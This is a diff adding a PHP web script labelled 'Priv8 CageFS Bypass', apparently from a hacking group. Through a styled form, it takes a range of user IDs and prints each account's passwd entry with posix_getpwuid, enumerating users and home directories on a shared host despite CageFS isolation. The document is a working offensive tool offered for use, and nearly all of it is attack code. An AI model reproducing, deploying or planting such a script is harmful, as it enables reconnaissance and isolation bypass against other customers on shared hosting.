@@ -1,0 +1,56 @@
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
+<?php 
+#Priv8 CageFS BYPASS
+#By Br0keN
+#/etc/passwd
+?> 
+<center>
+<html dir="ltr"> 
+<head> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
+<title>Priv8 CageFS Bypass</title> 
+<style type="text/css" media="screen"> 
+body { 
+    font-size: 10px; 
+    font-family: verdana; 
+} 
+INPUT { 
+    BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 10px; BORDER-LEFT-COLOR: #D50428; BACKGROUND: #590009; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #D50428; COLOR: #ffffff; BORDER-TOP-COLOR: #D50428; FONT-FAMILY: verdana; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #D50428 
+} 
+</style> 
+</head> 
+<body dir="ltr" alink="#D50428"  bgcolor="#ffffff" link="#00c000" text="#D50428" vlink="#000000"> 
+<p align="center" dir="rtl"><font color="#D50428"><span lang="ar-sa"><font size=5><b>Priv8 CageFS Bypass<br></font>
+<p align="center" dir="rtl"><font color="#D50428"><span lang="ar-sa"><font size=2> EHC TeaM By Br0keN <br><br>
+<p align="center" dir="rtl"><font color="#D50428"><span lang="ar-sa"><font size=2>Web:vb.ehcommunity.com<br><br><br>
+etc/passwd/</b></font><br>
+<?php 
+error_reporting(E_ALL ^ E_NOTICE); 
+
+    if (function_exists('posix_getpwuid')) 
+    { 
+        if (isset($_POST['Br']) && isset($_POST['x0'])) 
+        { 
+            $Br = intval($_POST['Br']); 
+            $x0 = intval($_POST['x0']); 
+            while ($Br < $x0) 
+            { 
+                $uid = posix_getpwuid($Br); 
+                if ($uid) 
+                { 
+                    $uid["dir"] = "<a href=\"\">".$uid["dir"]."</a>"; 
+                    echo join(":",$uid)."<br>"; 
+                } 
+                $Br++; 
+            } 
+        } else 
+        { 
+            echo ' 
+            <form method="POST" action="?br0=x0">Uid   
+            FROM : <input type="text" name="Br" value="1" size="4"> 
+            TO : <input type="text" name="x0" value="1000" size="4"> 
+            <input type="submit" name="Show" value="Show">'; 
+        } 
+    } else die("Error..! Posix Functions are disabled..!!!");
+    die(); 
+?>
